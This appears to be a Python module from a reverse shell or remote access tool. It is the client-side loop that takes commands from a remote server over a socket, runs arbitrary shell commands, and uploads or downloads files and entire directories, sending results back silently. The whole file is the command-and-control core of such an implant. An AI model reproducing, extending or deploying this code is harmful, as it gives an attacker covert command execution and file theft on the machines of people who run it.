#!/usr/bin/env python3


import socket
import struct
import platform
from exception import ServerDisconnectedError
from command import Command


class Interaction:
    def __init__(self, sock: socket.socket) -> None:
        self._sock = sock 
        self._system = f"{platform.system()} {platform.release()}"
    
    @property
    def sock(self):
        return self._sock
        
    def _create_packet(self, result: bytes) -> bytes:
        result_length = len(result)
        size = struct.pack("<l", result_length)
        packet = size + result
        return packet
    
    def _send_packet(self, packet: bytes) -> None:
        self._sock.sendall(packet)
      
    def _get_command(self) -> str:
        command_length = struct.unpack("<L", self._sock.recv(4))[0]
        command = self._sock.recv(command_length)
        return command.decode("utf-8")
    
    def _handle_command(self, received: str) -> bytes:
        output = b"Exit code 1."
        command = Command(received, self)
        cli = command.get_cli()
        
        match cli:
            
            case "cd":
                output = command.chdir()
            
            case "upload":
                try:
                    output = command.download()
                except Exception as ex:
                    output = f"Unable to download the file due to -> {ex}".encode("utf-8")
            case "download":
                try:
                    output = command.upload()
                except Exception as ex:
                    output = f"Unable to download the file due to -> {ex}".encode("utf-8")
            
            case "upload_dir":
                try:
                    output = command.upload_directory()
                except Exception as ex:
                    output = f"Unable to download the directory due to -> {ex}".encode("utf-8")
            
            case "download_dir":
                try:
                    output = command.download_directory()
                except Exception as ex:
                    output = f"Unable to download the directory due to -> {ex}".encode("utf-8")
            
            case _:
                output = command.execute() 
        return output
        
    def interact(self) -> None:
        while True:
            received = self._get_command()
            if received == "quit":
                self._sock.close()
                raise ServerDisconnectedError("The server has disconnected !")
            output = self._handle_command(received)
            packet = self._create_packet(output)
            try:
                self._send_packet(packet)
            except Exception as ex:
                pass